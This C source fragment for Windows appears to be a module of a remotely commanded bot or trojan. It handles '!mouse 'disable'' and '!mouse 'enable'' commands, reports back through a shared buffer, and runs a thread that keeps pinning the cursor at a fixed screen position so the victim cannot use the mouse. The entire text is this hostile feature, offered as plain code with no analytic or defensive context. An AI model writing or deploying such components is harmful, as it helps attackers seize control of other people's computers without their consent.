bool mouse(char CmdLine[500]);
void LoopMouse(void);

bool EnableMouse = true;

bool mouse(char CmdLine[500])
{
	DWORD		MouseThreadId;

	if(CheckCmdLine(CmdLine, 2) == true)
	{
		if(lstrcmp(CmdLine, "!mouse 'disable'") == 0)
		{
			EnableMouse = false;
			if(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LoopMouse, 0, 0, &MouseThreadId) != 0)
			{
				lstrcpy(MainBuffer, "Mouse disabled.");
				return true;
			}
		}
		
		if(lstrcmp(CmdLine, "!mouse 'enable'") == 0)
		{
			lstrcpy(MainBuffer, "Mouse enabled.");
			EnableMouse = true;
			return true;
		}
	}

	return false;
}

void LoopMouse(void)
{
	while(EnableMouse == false)
	{
		SetCursorPos(213, 213);
	}

	return;
}
